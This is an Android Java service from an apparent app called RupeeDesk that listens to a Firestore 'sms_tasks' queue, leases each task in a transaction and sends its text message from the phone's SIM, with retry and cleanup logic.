package com.rupeedesk.smsaautosender;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager; // <-- ADDED
import android.net.NetworkInfo; // <-- ADDED
import android.os.Build;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.ListenerRegistration; // <-- ADDED
import com.google.firebase.firestore.Query;
import com.google.firebase.firestore.Transaction;
import com.google.firebase.firestore.WriteBatch;
import com.rupeedesk.R;

import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class SmsService extends Service {
    private static final String CHANNEL_ID = "SmsServiceChannel";
    private static final String TAG = "SmsService";

    private final FirebaseFirestore db = FirebaseFirestore.getInstance();
    private String userId;
    private int subscriptionId;

    // --- NEW: This will hold our real-time listener ---
    private ListenerRegistration firestoreListener;

    public static void startService(Context context) {
        Intent serviceIntent = new Intent(context, SmsService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(serviceIntent);
        } else {
            context.startService(serviceIntent);
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("RupeeDesk SMS Service")
                .setContentText("Actively listening for new tasks...") // Updated text
                .setSmallIcon(R.mipmap.ic_launcher) // Your app icon
                .setOngoing(true)
                .build();
        startForeground(1, notification);

        Log.d(TAG, "SmsService started in foreground.");

        // --- REPLACED 24/7 LOOP WITH LISTENER ---
        startSmsListener();
    }

    /**
     * NEW: Attaches a real-time listener to Firestore.
     */
    private void startSmsListener() {
        // Stop any old listener
        if (firestoreListener != null) {
            firestoreListener.remove();
        }

        // Get user details
        SharedPreferences prefs = getApplicationContext().getSharedPreferences("AppPrefs", Context.MODE_PRIVATE);
        userId = prefs.getString("userId", null);
        subscriptionId = prefs.getInt("subscriptionId", -1);

        if (userId == null || userId.isEmpty()) {
            Log.e(TAG, "No UserID bound. Listener not started.");
            return;
        }

        if (!isNetworkAvailable()) {
            Log.e(TAG, "No network. Listener not started.");
            // We should try again later, maybe with a handler
            return;
        }

        Log.d(TAG, "Attaching Firestore Snapshot Listener...");

        // This query finds all tasks this phone can send (pending or failed)
        Query query = db.collection("sms_tasks")
                .whereIn("status", Arrays.asList("pending", "failed"))
                .orderBy("createdAt", Query.Direction.ASCENDING)
                .limit(5); // Only grab 5 at a time

        firestoreListener = query.addSnapshotListener((snapshot, error) -> {
            if (error != null) {
                Log.e(TAG, "🔥 Firestore Listen failed: ", error);
                return;
            }

            if (snapshot != null && !snapshot.isEmpty()) {
                Log.d(TAG, "✅ New tasks received from listener. Processing " + snapshot.size() + " tasks...");

                // Process all new tasks immediately
                for (DocumentSnapshot doc : snapshot.getDocuments()) {
                    // Lease the task so we (and others) don't process it again
                    leaseAndProcessTask(doc, subscriptionId);
                }
            } else {
                Log.d(TAG, "Queue is empty or snapshot was null.");
            }
        });
    }

    /**
     * Helper method to check for internet
     */
    private boolean isNetworkAvailable() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm == null) return false;
        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
        return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
    }


    // --- All worker methods are now part of the service ---

    private void leaseAndProcessTask(DocumentSnapshot doc, int subId) {
        String id = doc.getId();
        DocumentReference docRef = db.collection("sms_tasks").document(id);

        db.runTransaction((Transaction.Function<DocumentSnapshot>) transaction -> {
            DocumentSnapshot snapshot = transaction.get(docRef);
            String status = snapshot.getString("status");

            // We ONLY lease "pending" or "failed"
            if ("pending".equals(status) || "failed".equals(status)) {
                Long retryCount = snapshot.getLong("retryCount");
                if (retryCount == null) retryCount = 0L;
                if (retryCount >= 3) {
                    Log.w(TAG, "🗑️ Deleting task " + id + " (max retries reached).");
                    transaction.delete(docRef);
                    return null;
                }
                // ** LEASE THE TASK **
                Log.d(TAG, "Leasing task: " + id);
                transaction.update(docRef, "status", "sending", "leasedBy", userId, "leasedAt", new Date());
                return snapshot;
            } else {
                // Task was already leased by someone else or is already "sending"
                Log.d(TAG, "Task " + id + " was already leased/sending. Skipping.");
                return null;
            }
        }).addOnSuccessListener(snapshot -> {
            if (snapshot != null) {
                // We successfully leased this task
                sendSms(snapshot, userId, subId);
            }
        }).addOnFailureListener(e -> {
            Log.e(TAG, "Failed to lease task " + id + ": " + e.getMessage());
        });
    }

    private void sendSms(DocumentSnapshot doc, String senderUserId, int subId) {
        String id = doc.getId();
        String phone = doc.getString("phone");
        String message = doc.getString("message");
        Long retryCount = doc.getLong("retryCount");
        if (retryCount == null) retryCount = 0L;

        if (phone == null || message == null) {
            Log.e(TAG, "Skipping task " + id + " (missing phone or message).");
            return;
        }

        try {
            Intent sentIntent = new Intent(getApplicationContext(), SmsSentReceiver.class);
            sentIntent.putExtra("documentId", id);
            sentIntent.putExtra("userId", senderUserId);
            sentIntent.putExtra("retryCount", retryCount);
            PendingIntent sentPI = PendingIntent.getBroadcast(
                    getApplicationContext(),
                    id.hashCode(),
                    sentIntent,
                    PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
            );

            SmsManager smsManager;
            if (subId != -1 && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                Log.d(TAG, "Using specific Subscription ID: " + subId);
                smsManager = SmsManager.getSmsManagerForSubscriptionId(subId);
            } else {
                Log.d(TAG, "Using default Subscription ID.");
                smsManager = SmsManager.getDefault();
            }

            smsManager.sendTextMessage(phone, null, message, sentPI, null);
            Log.d(TAG, "📬 Sending SMS for leased task: " + id + " (Attempt #" + (retryCount + 1) + ")");

        } catch (Exception e) {
            Log.e(TAG, "❌ Failed to initiate send for task " + id + ": " + e.getMessage());
            Map<String, Object> update = new HashMap<>();
            update.put("status", "failed");
            update.put("retryCount", retryCount + 1);
            update.put("lastError", "Send initiation failed: " + e.getMessage());
            update.put("leasedBy", null);
            update.put("leasedAt", null);
            db.collection("sms_tasks").document(id).update(update);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "SmsService destroyed. Detaching listener.");

        // --- NEW: Stop the listener ---
        if (firestoreListener != null) {
            firestoreListener.remove();
        }

        stopForeground(true);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "SMS Auto Sender Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
}
